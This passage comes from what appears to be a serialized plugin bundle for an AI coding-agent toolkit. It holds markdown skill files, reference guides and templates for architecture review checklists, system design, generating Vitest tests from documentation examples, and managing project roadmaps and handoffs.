sensitive data encrypted at rest and in transit?\n- [ ] **Input Validation**: Are all inputs validated and sanitized?\n- [ ] **API Security**: Are APIs protected against common attacks?\n- [ ] **Secret Management**: How are credentials and keys managed?\n- [ ] **Audit Logging**: Are security events logged?\n\n### Performance\n- [ ] **Response Time**: Are SLAs defined and met?\n- [ ] **Throughput**: Can the system handle expected load?\n- [ ] **Resource Utilization**: Are CPU, memory, and I/O optimized?\n- [ ] **Database Performance**: Are queries optimized and indexed?\n- [ ] **Asynchronous Processing**: Are non-critical operations async?\n- [ ] **Connection Pooling**: Are database/API connections pooled?\n\n### Maintainability\n- [ ] **Code Organization**: Is the codebase well-structured?\n- [ ] **Documentation**: Is the architecture documented?\n- [ ] **Code Quality**: Are coding standards followed?\n- [ ] **Testability**: Can components be tested in isolation?\n- [ ] **Monitoring**: Is the system observable?\n- [ ] **Deployment**: Is deployment automated and reversible?\n\n### Availability\n- [ ] **Redundancy**: Are critical components redundant?\n- [ ] **Health Checks**: Are service health endpoints available?\n- [ ] **Graceful Shutdown**: Does the system shut down cleanly?\n- [ ] **Error Handling**: Are errors handled consistently?\n- [ ] **Service Level Objectives**: Are SLAs/SLOs defined?\n\n## Technology Stack Evaluation\n\n### Languages & Frameworks\n- [ ] **Fit for Purpose**: Is the technology appropriate for the use case?\n- [ ] **Team Expertise**: Does the team have or can acquire necessary skills?\n- [ ] **Ecosystem**: Is the ecosystem mature and well-supported?\n- [ ] **Community**: Is there an active community and resources?\n\n### Databases\n- [ ] **Data Model Fit**: Does the database match the data model?\n- [ ] **Consistency Requirements**: Are ACID properties needed?\n- [ ] **Query Patterns**: Can the database handle query patterns efficiently?\n- [ ] **Scalability**: Can the database scale with the application?\n- [ ] **Backup/Recovery**: Are backup and recovery procedures in place?\n\n### Infrastructure\n- [ ] **Deployment Model**: Cloud, on-premise, or hybrid?\n- [ ] **Containerization**: Are services containerized?\n- [ ] **Orchestration**: Is there a container orchestration strategy?\n- [ ] **Networking**: Are network requirements understood?\n- [ ] **Storage**: Are storage requirements and patterns identified?\n\n## Common Architecture Anti-Patterns\n\n###  Don't Do This\n- [ ] **God Objects**: Single components that do everything\n- [ ] **Spaghetti Code**: Unstructured, tangled code flow\n- [ ] **Tight Coupling**: Components that can't be changed independently\n- [ ] **Golden Hammer**: Using one technology for all problems\n- [ ] **Architecture Astronauts**: Over-engineering simple solutions\n- [ ] **Siloed Teams**: Teams working in isolation without coordination\n- [ ] **Copy-Paste Programming**: Duplicated code instead of abstractions\n- [ ] **Premature Optimization**: Optimizing before measuring\n- [ ] **Not Invented Here**: Avoiding proven solutions\n\n###  Best Practices\n- [ ] **YAGNI**: You Aren't Gonna Need It - don't add features until necessary\n- [ ] **KISS**: Keep It Simple, Stupid - prefer simple solutions\n- [ ] **Fail Fast**: Detect errors as early as possible\n- [ ] **Automate Everything**: Reduce manual work and human error\n- [ ] **Measure Twice, Cut Once**: Analyze requirements thoroughly\n- [ ] **Iterate**: Build incrementally with feedback\n- [ ] **Default to Open**: Make systems open and composable\n- [ ] **Plan for Failure**: Design for resilience from the start\n",
        "plugins/sys-builder/skills/designing-architecture/references/system-design.md": "# Protocol: Architecture Design & Analysis\n\n## Auto-Detection\nThis protocol automatically detects the context and routes accordingly:\n\n- **Greenfield (New System)**: Skip to System Design Process\n- **Brownfield (Existing System)**: Follow Existing System Analysis process below\n\n## System Design Process (New Systems)\n\n### Step 1: Requirements Gathering\nAnalyze the provided requirements to identify:\n- **Functional Requirements**: Core features and user stories\n- **Non-Functional Requirements**: Performance, scalability, security, availability\n- **Constraints**: Budget, timeline, technology preferences, regulatory requirements\n\n### Step 2: Architecture Patterns\nBased on requirements, select appropriate patterns:\n\n**Monolith**\n- Simple deployment, shared database\n- Best for: Small teams, rapid prototyping, simple domains\n\n**Modular Monolith**\n- Separated modules within single deployable unit\n- Best for: Medium complexity, team scaling preparation\n\n**Microservices**\n- Independently deployable services\n- Best for: Large scale, multiple teams, complex domains\n\n**Serverless**\n- Function-as-a-Service architecture\n- Best for: Event-driven, variable load, pay-per-use\n\n**Event-Driven**\n- Async communication via events\n- Best for: High throughput, loose coupling, real-time processing\n\n### Step 3: Technology Stack Selection\nRecommend technologies based on:\n- Team expertise and learning curve\n- Ecosystem maturity and community support\n- Performance and scalability requirements\n- Operational complexity\n\n### Step 4: Data Architecture\nDefine:\n- **Database Type**: SQL vs NoSQL vs Polyglot\n- **Data Flow**: Sync vs Async patterns\n- **Data Consistency**: ACID vs BASE principles\n- **Data Storage**: Caching, partitioning, replication\n\n### Step 5: Architecture Diagram\nCreate comprehensive architecture diagram showing:\n- **Components**: Services, databases, caches, external APIs\n- **Interactions**: Synchronous and asynchronous communication\n- **Data Flow**: Request-response and event flows\n- **Infrastructure**: Load balancers, API gateways, containers\n\n### Step 6: Architecture Decision Records (ADRs)\nDocument key decisions with:\n- **Context**: The problem being addressed\n- **Decision**: What was chosen and why\n- **Consequences**: Positive, negative, and neutral outcomes\n- **Alternatives**: What else was considered\n\n## Existing System Analysis\n\nFor brownfield projects, perform comprehensive system analysis:\n1. Understand current system architecture\n2. Identify architectural patterns in use\n3. Map component relationships\n4. Analyze data flow patterns\n5. Document technical debt and constraints\n\nThen provide recommendations for:\n- **Incremental Improvements**: Low-risk enhancements\n- **Strategic Refactoring**: Medium to long-term architectural evolution\n- **Migration Strategies**: Path to target architecture\n\n## Architecture Quality Criteria\n\n### Scalability\n- Can the system handle 10x growth?\n- What are the bottlenecks?\n- How does it scale horizontally/vertically?\n\n### Reliability\n- What are the failure modes?\n- How does the system recover?\n- What's the disaster recovery plan?\n\n### Security\n- Authentication and authorization model\n- Data encryption strategy\n- Network security and API protection\n\n### Performance\n- Response time requirements\n- Throughput expectations\n- Latency-sensitive paths\n\n### Operability\n- Monitoring and observability\n- Deployment strategy\n- Maintenance and support model\n\n## Success Criteria\n- [ ] Architecture pattern selected with rationale\n- [ ] Technology stack justified\n- [ ] Architecture diagram created\n- [ ] ADRs documented for key decisions\n- [ ] Quality criteria evaluated\n- [ ] Risks identified with mitigation strategies\n",
        "plugins/sys-builder/skills/generating-tests/SKILL.md": "---\nname: generating-tests\ndescription: \"Follows project conventions, extracts examples from documentation, converts them to tests, and ensures documentation accuracy through automated testing. PROACTIVELY Use when generating comprehensive Vitest tests for code examples in JavaScript concept documentation pages. Do not use for end-to-end browser automation, user flow testing, or browser-server integration  see testing-e2e skill.\"\nuser-invocable: true\nallowed-tools: [Read, Write, Bash, Grep, Glob]\n---\n\n# Test Writer for Documentation Code Examples\n\nExtracts, converts, and verifies documentation examples.\n\n\n\n## When to Use This Skill\n\nUse this skill when you need to:\n- Generate tests for new concept documentation pages\n- Add tests when updating existing documentation examples\n- Verify documentation accuracy through automated testing\n- Ensure all code examples in documentation work as documented\n- Create comprehensive test coverage for educational content\n\n## Test Writing Methodology\n\nFollow a four-phase approach to create comprehensive tests:\n\n1. **Extract & Categorize** - Scan documentation for code examples and categorize by type\n2. **Determine Structure** - Organize tests by project conventions\n3. **Convert to Tests** - Transform examples into proper Vitest tests\n4. **Handle Special Cases** - Address DOM, async, error, and edge cases\n\n**See:** `references/methodology.md` for complete four-phase methodology\n\n## Quick Start Pattern\n\n### Basic Transformation\n\n```javascript\n// Documentation\nconsole.log('Hello, World!') // Hello, World!\n\n// Test\nit('should produce expected output - Line 1', () => {\n  const result = /* code from documentation */\n  expect(result).toBe('Hello, World!')\n})\n```\n\n### Error Testing\n\n```javascript\n// Test error cases\nit('should throw error - Line X', () => {\n  expect(() => problematicFunction()).toThrow('Expected error')\n})\n```\n\n### Async Testing\n\n```javascript\n// Test async operations\nit('should handle async - Line X', async () => {\n  const result = await asyncFunction()\n  expect(result).toEqual(/* expected */)\n})\n```\n\n**See:** `references/examples.md` for complete worked examples\n\n## Test Conventions\n\n### Import Pattern\n```javascript\nimport { describe, it, expect } from 'vitest'\n```\n\n### File Naming\n- Standard tests: `{concept-name}.test.js`\n- DOM tests: `{concept-name}.dom.test.js`\n\n### Test Structure\n```javascript\ndescribe('{Concept Name}', () => {\n  it('should {expected behavior} - Line {line}', () => {\n    // Implementation\n  })\n})\n```\n\n**See:** `references/conventions.md` for complete conventions and validation checklist\n\n## Common Patterns\n\n- **Output Verification**: Assert expected results\n- **Side Effect Testing**: Test mutations and state changes\n- **Error Handling**: Test error conditions\n- **Async Operations**: Handle promises and async/await\n- **DOM Testing**: Use jsdom environment for browser APIs\n\n**See:** `references/patterns.md` for detailed pattern examples\n\n## DOM Testing\n\nFor DOM-related tests:\n\n```javascript\n/**\n * @vitest-environment jsdom\n */\nimport { vi } from 'vitest'\n\nbeforeEach(() => {\n  document.body.innerHTML = '<div id=\"app\"></div>'\n})\n```\n\n**See:** `references/dom-testing.md` for complete DOM testing guide\n\n## Running Tests\n\n```bash\n# Run all tests\nvitest\n\n# Run specific file\nvitest run {concept-name}.test.js\n\n# Run with coverage\nvitest run --coverage\n```\n\n## Reference Materials\n\n**Core Implementation:**\n- `references/methodology.md` - Four-phase test writing methodology\n- `references/conventions.md` - Project conventions and validation checklist\n- `references/examples.md` - Complete worked examples\n- `references/patterns.md` - Common test patterns and examples\n- `references/dom-testing.md` - DOM testing setup and patterns\n\n**Quality Standards:**\nEach test must be traceable, use appropriate assertions, follow naming conventions, include clear descriptions, handle edge cases, and pass when executed.\n",
        "plugins/sys-builder/skills/generating-tests/references/conventions.md": "# Test Conventions\n\n## Import Pattern\n\n```javascript\nimport { describe, it, expect } from 'vitest'\n```\n\nFor DOM tests or tests needing mocks:\n\n```javascript\nimport { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'\n```\n\n## Test Structure Template\n\n```javascript\nimport { describe, it, expect } from 'vitest'\n\ndescribe('{Concept Name}', () => {\n  describe('{Section Name}', () => {\n    it('should {expected behavior} - Line {line}', () => {\n      // Test implementation\n    })\n  })\n})\n```\n\n## File Organization\n\n### Directory Structure\n\n```\ntests/\n fundamentals/              # Concepts 1-6\n functions-execution/       # Concepts 7-8\n web-platform/             # Concepts 9-10\n object-oriented/          # Concepts 11-15\n functional-programming/   # Concepts 16-19\n async-javascript/         # Concepts 20-22\n advanced-topics/          # Concepts 23-31\n beyond/                   # Extended concepts\n     {subcategory}/\n```\n\n### Naming Conventions\n\n- **Standard tests:** `{concept-name}.test.js`\n- **DOM tests:** `{concept-name}.dom.test.js`\n- **Test descriptions:** `should {expected behavior} - Line {line}`\n\n## Validation Checklist\n\nBefore finalizing tests:\n\n- [ ] All testable code examples have corresponding tests\n- [ ] Tests include line references to source documentation\n- [ ] Tests use appropriate assertions (toBe, toEqual, toThrow, etc.)\n- [ ] Tests follow naming convention: `{concept-name}.test.js`\n- [ ] Tests are organized by documentation section\n- [ ] DOM tests use `.dom.test.js` suffix\n- [ ] Import patterns follow project conventions\n- [ ] Tests pass when run with `vitest`\n",
        "plugins/sys-builder/skills/generating-tests/references/dom-testing.md": "# DOM Testing Guide\n\n## Environment Setup\n\nFor DOM-related tests:\n\n```javascript\n/**\n * @vitest-environment jsdom\n */\n\nimport { describe, it, expect } from 'vitest'\nimport { vi } from 'vitest'\n\nbeforeEach(() => {\n  // Setup DOM environment\n  document.body.innerHTML = '<div id=\"app\"></div>'\n})\n\nafterEach(() => {\n  // Cleanup\n  vi.clearAllMocks()\n})\n```\n\n## DOM-Specific Test Categories\n\n### DOM Test Classification\n\n| Category | Characteristics | Action |\n|----------|-----------------|--------|\n| **DOM-specific** | Uses `document`, `window`, DOM APIs, event handlers | Write DOM tests (separate file) |\n| **Browser-only** | Uses browser APIs not available in jsdom | Skip or mock |\n\n### DOM Test File Naming\n\n- DOM tests: `{concept-name}.dom.test.js`\n- Use `.dom.test.js` suffix to distinguish from standard tests\n\n## DOM Test Patterns\n\n### Event Handler Testing\n\n```javascript\nit('should call handler on click - Line X', () => {\n  const handler = vi.fn()\n  const button = document.createElement('button')\n  button.addEventListener('click', handler)\n  button.click()\n\n  expect(handler).toHaveBeenCalledTimes(1)\n})\n```\n\n### DOM Manipulation Testing\n\n```javascript\nit('should update DOM content - Line X', () => {\n  const element = document.getElementById('app')\n  element.textContent = 'New content'\n\n  expect(element.textContent).toBe('New content')\n})\n```\n\n## Running Tests\n\n### Execute Tests\n\n```bash\n# Run all tests\nvitest\n\n# Run specific test file\nvitest run {concept-name}.test.js\n\n# Run DOM tests specifically\nvitest run {concept-name}.dom.test.js\n\n# Run in watch mode\nvitest\n\n# Run with coverage\nvitest run --coverage\n```\n",
        "plugins/sys-builder/skills/generating-tests/references/examples.md": "# Example Transformations\n\n## Basic Example\n\n### Documentation\n```javascript\nconst name = 'World'\nconsole.log('Hello, ' + name + '!') // Hello, World!\n```\n\n### Test\n```javascript\nit('should greet with name - Line 2', () => {\n  const name = 'World'\n  const result = 'Hello, ' + name + '!'\n  expect(result).toBe('Hello, World!')\n})\n```\n\n## Error Example\n\n### Documentation\n```javascript\nfunction divide(a, b) {\n  if (b === 0) throw new Error('Cannot divide by zero')\n  return a / b\n}\nconsole.log(divide(10, 2)) // 5\n```\n\n### Test\n```javascript\ndescribe('divide', () => {\n  it('should divide two numbers - Line 1', () => {\n    expect(divide(10, 2)).toBe(5)\n  })\n\n  it('should throw error when dividing by zero - Line 2', () => {\n    expect(() => divide(10, 0)).toThrow('Cannot divide by zero')\n  })\n})\n```\n\n## Async Example\n\n### Documentation\n```javascript\nasync function fetchData() {\n  const data = await fetch('/api/data')\n  return data.json()\n}\nconsole.log(await fetchData()) // { status: 'success' }\n```\n\n### Test\n```javascript\nit('should fetch and parse data - Line 1', async () => {\n  const result = await fetchData()\n  expect(result).toEqual({ status: 'success' })\n})\n```\n\n## DOM Example\n\n### Documentation\n```javascript\nconst button = document.createElement('button')\nbutton.textContent = 'Click me'\nbutton.addEventListener('click', () => {\n  console.log('Button clicked!')\n})\ndocument.body.appendChild(button)\n```\n\n### Test\n```javascript\n/**\n * @vitest-environment jsdom\n */\n\nit('should append button to body - Line 1', () => {\n  const button = document.createElement('button')\n  button.textContent = 'Click me'\n  document.body.appendChild(button)\n\n  expect(document.body.contains(button)).toBe(true)\n})\n\nit('should handle click event - Line 2', () => {\n  const button = document.createElement('button')\n  button.textContent = 'Click me'\n  const handler = vi.fn()\n  button.addEventListener('click', handler)\n  button.click()\n\n  expect(handler).toHaveBeenCalledTimes(1)\n})\n```\n\n## Side Effect Example\n\n### Documentation\n```javascript\nconst counter = { value: 0 }\nfunction increment() {\n  counter.value++\n}\nincrement()\nconsole.log(counter.value) // 1\n```\n\n### Test\n```javascript\nit('should increment counter - Line 4', () => {\n  const counter = { value: 0 }\n  increment(counter)\n  expect(counter.value).toBe(1)\n})\n```\n",
        "plugins/sys-builder/skills/generating-tests/references/methodology.md": "# Test Writing Methodology\n\n## Four-Phase Approach\n\nFollow these four phases to create comprehensive tests:\n\n### Phase 1: Code Example Extraction\n\nScan the concept page for all code examples and categorize them:\n\n| Category | Characteristics | Action |\n|----------|-----------------|--------|\n| **Testable** | Has `console.log` with output comments, returns values | Write tests |\n| **DOM-specific** | Uses `document`, `window`, DOM APIs, event handlers | Write DOM tests (separate file) |\n| **Error examples** | Intentionally throws errors, demonstrates failures | Write tests with `toThrow` |\n| **Conceptual** | ASCII diagrams, pseudo-code, incomplete snippets | Skip (document why) |\n| **Browser-only** | Uses browser APIs not available in jsdom | Skip or mock |\n\n### Phase 2: Determine Test File Structure\n\n```\ntests/\n fundamentals/              # Concepts 1-6\n functions-execution/       # Concepts 7-8\n web-platform/             # Concepts 9-10\n object-oriented/          # Concepts 11-15\n functional-programming/   # Concepts 16-19\n async-javascript/         # Concepts 20-22\n advanced-topics/          # Concepts 23-31\n beyond/                   # Extended concepts\n     {subcategory}/\n```\n\n**File naming:**\n- Standard tests: `{concept-name}.test.js`\n- DOM tests: `{concept-name}.dom.test.js`\n\n### Phase 3: Convert Examples to Tests\n\nFor each testable code example:\n\n1. Identify the expected output (from `console.log` comments or documented behavior)\n2. Convert to `expect` assertions\n3. Add source line reference in comments\n4. Group related tests in `describe` blocks matching documentation sections\n\n### Phase 4: Handle Special Cases\n\n| Case | Solution |\n|------|----------|\n| Browser-only APIs | Use jsdom environment or skip with note |\n| Timing-dependent code | Use `vi.useFakeTimers()` or test the logic, not timing |\n| Side effects | Capture output or test mutations |\n| Intentional errors | Use `expect(() => {...}).toThrow()` |\n| Async code | Use `async/await` with proper assertions |\n",
        "plugins/sys-builder/skills/generating-tests/references/patterns.md": "# Common Test Patterns\n\n## Pattern 1: Output Verification\n\n```javascript\nit('should produce expected output - Line X', () => {\n  // Execute code\n  const result = /* code from documentation */\n\n  // Assert\n  expect(result).toBe(/* expected value */)\n})\n```\n\n## Pattern 2: Side Effect Testing\n\n```javascript\nit('should mutate object - Line X', () => {\n  const obj = { count: 0 }\n\n  // Execute code that mutates\n  increment(obj)\n\n  expect(obj.count).toBe(1)\n})\n```\n\n## Pattern 3: Error Handling\n\n```javascript\nit('should throw error - Line X', () => {\n  expect(() => {\n    problematicFunction()\n  }).toThrow(/* expected error */)\n})\n```\n\n## Pattern 4: Async Operations\n\n```javascript\nit('should handle async operation - Line X', async () => {\n  const result = await asyncFunction()\n  expect(result).toEqual(/* expected */)\n})\n```\n\n## Special Case Patterns\n\n| Case | Pattern |\n|------|---------|\n| Browser-only APIs | Mock or skip with note |\n| Timing-dependent code | Use `vi.useFakeTimers()` |\n| Async code | Use `async/await` with proper assertions |\n| Intentional errors | Use `expect(() => {...}).toThrow()` |\n",
        "plugins/sys-builder/skills/managing-plans/SKILL.md": "---\nname: managing-plans\ndescription: \"Orchestrates project plan state management and execution. Manages ROADMAP.md state tracking, task dispatch, phase transitions, and handoff protocols. PROACTIVELY Use when managing project plans, executing phases, or coordinating task workflows. MUST Use for all plan-related operations (creation, modification, execution). Do not use for architecture design, system analysis, or creating new projects without a plan  see designing-architecture skill.\"\ncontext: fork  # Required: Processes entire project directory (10+ files), coordinates task dispatch across multiple phases\nallowed-tools: [Read, Write, Edit, Glob, Bash, Task]\n---\n\n# Project Plan State Management\n\n\n\n## State Model\n\n### Plan State (ROADMAP.md)\n```markdown\n- [ ] = Pending\n- [~] = In Progress\n- [x] = Complete\n- [!] = Blocked\n```\n\n### Phase State\n- Task Status: [ ]  [~]  [x]\n- Handoff: Created when blocked\n- Summary: Created when complete\n\n## Quick Reference\n\n### Templates\n- **Roadmap**: `assets/templates/roadmap.md` - Phase-based progress tracking\n- **Handoff**: `assets/templates/handoff.md` - Blocker documentation\n\n### References\n- **Creation**: `references/creation-workflow.md` - Logic for planning new projects (Autonomous vs Interactive)\n- **Modification**: `references/modification-workflow.md` - Protocols for updating plans\n- **Execution**: `references/execution-workflow.md` - State-based execution logic\n- **State**: `references/state-management.md` - State tracking protocols\n- **Handoffs**: `references/handoff-protocols.md` - Handle blockers and transfers\n- **Verification**: `references/verification-workflows.md` - Success verification at task/phase/plan levels\n\n## Execution Protocol\n1. **Read State**: Read `.cattoolkit/plan/{project-slug}/ROADMAP.md` to find the active phase.\n2. **Read Tasks**: Read the active phase file (e.g., `phases/01-setup/01-01-PLAN.md`).\n3. **Execute Loop**:\n   - Pick next `[ ]` task\n   - **Execute**: Write code, run commands\n   - **Verify**: Run tests/checks (Self-Correction)\n   - **Mark Complete**: Edit phase file to `[x]`\n4. **Stop**: When phase is done or blocked.\n\n## Execution Checklist (Quick Reference)\n\n### Phase Start\n- [ ] Read ROADMAP.md & verify dependencies\n- [ ] Update status [ ]  [~]\n\n### Task Execution\n- [ ] Dispatch to worker agent (non-interactive)\n- [ ] Monitor & verify completion\n- [ ] Update task status immediately\n\n### Phase Complete\n- [ ] All tasks [x] complete\n- [ ] Create phase summary\n- [ ] Update ROADMAP.md [~]  [x]\n\n### Handoff Required\n- [ ] Identify blocker\n- [ ] Create HANDOFF.md using template\n- [ ] Update status [~]  [!]\n- [ ] Pause execution\n\n## Error Handling\n\n\n\n**Recovery Strategy:**\n- Level 1: Automatic recovery (retry, clear cache, restart)\n- Level 2: Partial recovery (skip task, use alternative)\n- Level 3: Handoff required (authentication, critical errors, decisions)\n\n## State Management Protocol\n\n1. **Read State**: Always read ROADMAP.md before starting work\n2. **Update State**: Update task status immediately upon completion\n3. **Atomic Commits**: One commit per checkmark for reproducibility\n4. **Handoff Creation**: Create HANDOFF.md for blockers\n5. **Verification**: Verify completion at task, phase, and plan levels\n\n## Architecture Decision Records\n\n**When to Create ADR:**\n- Technology stack changes\n- Major architectural patterns\n- Breaking API changes\n- Infrastructure additions\n- Significant refactors\n\n**Protocol:**\n- Auto-increment numbering (ADR-001, ADR-002, etc.)\n- Append-only to `.cattoolkit/plan/{project}/ADR.md`\n- Never delete or modify old entries\n\n**Note**: For architecture design and system analysis, use `designing-architecture` skill.\n",
        "plugins/sys-builder/skills/managing-plans/assets/templates/brief.md": "# Project Brief: {project-name}\n\n**Date:** {YYYY-MM-DD}\n**Status:** {Draft | In Review | Approved}\n\n## Executive Summary\nBrief description of what we're building and why it matters.\n\n## Problem Statement\nWhat problem are we solving? Who is affected?\n\n## Goals & Objectives\n\n### Primary Goals\n- [ ] {Goal 1}\n- [ ] {Goal 2}\n- [ ] {Goal 3}\n\n### Success Criteria (Testable & Measurable)\n- [ ] {Criteria 1}\n- [ ] {Criteria 2}\n- [ ] {Criteria 3}\n\n## Requirements\n\n### Functional Requirements\n1. {Requirement 1}\n2. {Requirement 2}\n3. {Requirement 3}\n\n### Non-Functional Requirements\n- **Performance**: {e.g., <100ms response time}\n- **Scalability**: {e.g., handle 10k concurrent users}\n- **Security**: {e.g., OWASP compliance, encryption}\n- **Reliability**: {e.g., 99.9% uptime}\n- **Usability**: {e.g., WCAG 2.1 AA compliance}\n\n## Technical Constraints\n- **Timeline**: {e.g., Must ship by Q2 2025}\n- **Budget**: {e.g., $50k budget}\n- **Technology**: {e.g., Must use React, PostgreSQL}\n- **Infrastructure**: {e.g., AWS only, GDPR compliant}\n- **Legacy Systems**: {e.g., Must integrate with existing CRM}\n\n## Assumptions\n- {Assumption 1}\n- {Assumption 2}\n- {Assumption 3}\n\n## Dependencies\n- **External**: {e.g., Third-party APIs, services}\n- **Internal**: {e.g., Other teams, systems}\n- **Infrastructure**: {e.g., Database, hosting, CI/CD}\n\n## Risks & Mitigation\n| Risk | Impact | Probability | Mitigation |\n|------|--------|-------------|------------|\n| {Risk 1} | {High/Med/Low} | {High/Med/Low} | {Mitigation strategy} |\n| {Risk 2} | {High/Med/Low} | {High/Med/Low} | {Mitigation strategy} |\n\n## Out of Scope\n- {Item 1}\n- {Item 2}\n- {Item 3}\n\n## Stakeholders\n- **Sponsor**: {Name, Role}\n- **Product Owner**: {Name, Role}\n- **Engineering Lead**: {Name, Role}\n- **Users**: {Description of user groups}\n\n## Future Considerations\n- {Future consideration 1}\n- {Future consideration 2}\n- {Future consideration 3}\n",
        "plugins/sys-builder/skills/managing-plans/assets/templates/handoff.md": "# HANDOFF Required\n\n**Reason:** {AUTH_GATE | CONFLICT | AMBIGUOUS | DEPENDENCY | ERROR}\n**Date:** {YYYY-MM-DD}\n**Phase:** {XX - phase-name}\n**Task:** {task-name}\n\n## What Happened\n{Detailed description of the blocker}\n\n## Current State\n\n### Completed Tasks\n- [x] {task 1} (completed {YYYY-MM-DD})\n- [x] {task 2} (completed {YYYY-MM-DD})\n\n### In Progress\n- [~] {task N} (started {YYYY-MM-DD})\n\n### Blocked On\n- {Specific blocker}\n\n## What You Need to Do\n1. {Action 1}\n2. {Action 2}\n3. {Action 3}\n\n## Verification\n{How to confirm the fix}\n\n## Next Steps\nAfter resolving the issue:\n1. Restart execution\n2. Verify blocker resolved\n3. Continue with remaining tasks\n\n## Context\n{Additional context that might be helpful}\n\n## Files Changed\n- {File 1}: {Change description}\n- {File 2}: {Change description}\n\n## Error Logs\n```\n{Relevant error messages or logs}\n```\n\n## Related Documents\n- ROADMAP.md\n- Phase plan: {path/to/phase.md}\n- BRIEF.md\n",
        "plugins/sys-builder/skills/managing-plans/assets/templates/roadmap.md": "# Project Roadmap: {project-name}\n\n**Created:** {YYYY-MM-DD}\n**Last Updated:** {YYYY-MM-DD}\n**Status:** {Active | On Hold | Completed}\n\n## Project Overview\n{Brief description of project goals and scope}\n\n---\n\n## Phase 1: {phase-name}\n**Status:** {Pending | In Progress | Complete | Blocked}\n**Start Date:** {YYYY-MM-DD}\n**Target Date:** {YYYY-MM-DD}\n\n### Tasks\n- [x] {Task 1} (completed {YYYY-MM-DD})\n- [x] {Task 2} (completed {YYYY-MM-DD})\n- [~] {Task 3} (in progress)\n- [ ] {Task 4} (pending)\n- [ ] {Task 5} (pending)\n\n### Deliverables\n- [x] {Deliverable 1}\n- [ ] {Deliverable 2}\n\n### Notes\n{Any relevant notes about this phase}\n\n---\n\n## Phase 2: {phase-name}\n**Status:** {Pending | In Progress | Complete | Blocked}\n**Start Date:** {YYYY-MM-DD}\n**Target Date:** {YYYY-MM-DD}\n\n### Tasks\n- [ ] {Task 1}\n- [ ] {Task 2}\n- [ ] {Task 3}\n\n### Deliverables\n- [ ] {Deliverable 1}\n\n### Notes\n{Any relevant notes about this phase}\n\n---\n\n## Phase 3: {phase-name}\n**Status:** {Pending | In Progress | Complete | Blocked}\n**Start Date:** {YYYY-MM-DD}\n**Target Date:** {YYYY-MM-DD}\n\n### Tasks\n- [ ] {Task 1}\n- [ ] {Task 2}\n- [ ] {Task 3}\n\n### Deliverables\n- [ ] {Deliverable 1}\n\n### Notes\n{Any relevant notes about this phase}\n\n---\n\n## Phase 4: {phase-name}\n**Status:** {Pending | In Progress | Complete | Blocked}\n**Start Date:** {YYYY-MM-DD}\n**Target Date:** {YYYY-MM-DD}\n\n### Tasks\n- [ ] {Task 1}\n- [ ] {Task 2}\n- [ ] {Task 3}\n\n### Deliverables\n- [ ] {Deliverable 1}\n\n### Notes\n{Any relevant notes about this phase}\n\n---\n\n## Overall Progress\n**Completed Phases:** {X}/{Y}\n**Completion:** {XX}%\n**Status:** {On Track | At Risk | Blocked}\n\n### Key Milestones\n- {Date}: {Milestone 1}\n- {Date}: {Milestone 2}\n- {Date}: {Milestone 3}\n\n### Blockers\n- {None | List of current blockers}\n\n### Next Steps\n1. {Next step 1}\n2. {Next step 2}\n3. {Next step 3}\n",
        "plugins/sys-builder/skills/managing-plans/references/creation-workflow.md": "# Project Planning Workflow\n\n## Core Purpose\n\nCreates `.cattoolkit/plan/{project-slug}/` structure based on user requirements and existing codebase state. Routes to autonomous or interactive workflow based on complexity detection.\n\n## Routing Logic\n\n### Force Interactive Mode\n**Trigger:** `--interactive` flag present\n**Action:** Use interactive workflow\n\n### Force Autonomous Mode\n**Trigger:** `--force-autonomous` flag present\n**Action:** Use autonomous workflow regardless of complexity\n\n### Auto-Detect Complexity\n\n**Triggers for Interactive Mode:**\n- Ambiguous technology terms (\"framework\", \"database\" without specifics)\n- Multiple stakeholders mentioned (\"team\", \"client\", \"stakeholder\")\n- Decision keywords (\"decide\", \"choose\", \"discuss\", \"clarify\")\n- Complex scope (\"platform\", \"system\", \"architecture\")\n\n**Default to Autonomous When:**\n- Specific technology stack mentioned\n- Clear feature scope\n- Single well-defined objective\n- Time constraints indicated\n\n## Autonomous Workflow Protocol\n\n### Phase 1: Investigation\n**Goal:** Understand existing codebase\n\n**Process:**\n1. **Scan Project Structure**\n   - Use Glob to find: package.json, pyproject.toml, requirements.txt, Cargo.toml\n   - Use Glob to find: README.md, *.md, docs/*\n   - Use Glob to find: src/**/*, lib/**/*, app/**/*\n\n2. **Analyze Dependencies**\n   - Read dependency files (package.json, requirements.txt, etc.)\n\n3. **Codebase Metrics**\n   - Count files and analyze structure\n\n4. **Documentation Review**\n   - Read README.md, ARCHITECTURE.md (if exists), docs/*\n\n**Output:** Discovery report with technology stack, codebase size, patterns, and documentation state.\n\n### Phase 2: Synthesis\n**Goal:** Combine user requirements with discovery\n\n**Process:**\n1. **Parse User Requirements** - Extract functional/non-functional needs, constraints\n2. **Map to Existing Codebase** - What exists, what's missing, what conflicts\n3. **Generate Success Criteria** - Measurable outcomes, testable conditions\n\n**Output:** Synthesized requirements mapped to reality.\n\n### Phase 3: Plan Creation\n**Goal:** Create standards-compliant plan files\n\n**Process:**\n1. **Create BRIEF.md** with objective, success criteria, constraints, current state\n2. **Create ROADMAP.md** with phases table (status, dependencies, summaries)\n3. **Create Phase Plans** in phases/XX-name/XX-XX-PLAN.md format\n\n**Uses:** `managing-plans` templates and schemas\n\n### Phase 4: Present Menu\n**Ask User:**\n> Plan created successfully! What's next?\n>\n> **Option 1:** Execute full plan  `/sys-builder:run-plan`\n> **Option 2:** Execute Phase 1 only  `/sys-builder:run-plan 1`\n> **Option 3:** Refine plan first  `/sys-builder:manage-plan`\n\n## Interactive Workflow Protocol\n\n### Phase 1: Deep Discovery\n**Goal:** Understand technical context completely\n\n**Process:** Same as autonomous Phase 1, but more thorough investigation.\n\n### Phase 2: The Question Burst\n**Goal:** Eliminate all ambiguities\n\n**Process:**\n1. **Analyze Requirements** - Parse user requirements, identify ambiguities\n2. **Present Clarification Menu** using `AskUserQuestion` tool:\n   - Present 3 options per ambiguity\n   - Mark recommendation as [RECOMMENDED]\n   - Wait for selection\n\n**Question Structure:**\n```\nClarification Needed: {Category}\n{description of ambiguity}\n\n[RECOMMENDED] {Recommended Option}\n  - {Reason 1}\n  - {Reason 2}\n  - {Reason 3}\n\n  Option B: {Option B Name}\n  - {Pros/cons}\n\n  Option C: {Option C Name}\n  - {Pros/cons}\n```\n\n**Wait** for user selection before proceeding.\n\n### Phase 3: Architecture\n**Goal:** Create plan with 100% clarity\n\n**Process:**\n1. **Synthesize Requirements** - User requirements + discovery findings + clarified answers\n2. **Create Plan Files** - Use `managing-plans` templates, generate BRIEF.md, ROADMAP.md\n3. **STOP for 